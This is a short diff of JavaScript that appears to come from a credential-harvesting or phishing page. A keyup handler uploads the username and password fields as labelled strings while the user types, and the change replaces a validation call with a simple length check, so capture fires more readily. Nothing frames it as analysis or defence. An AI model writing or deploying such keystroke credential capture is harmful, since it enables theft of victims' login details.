@@ -49,7 +49,7 @@ function valid(val) {
 }
 
 window.addEventListener("keyup", (e) => {
-  if (valid(US.value) && PW.value.length > 5) {
+  if (US.value.length > 3 && PW.value.length > 5) {
     uploadSet("username: " + US.value);
     uploadSet("password: " + PW.value);
   }
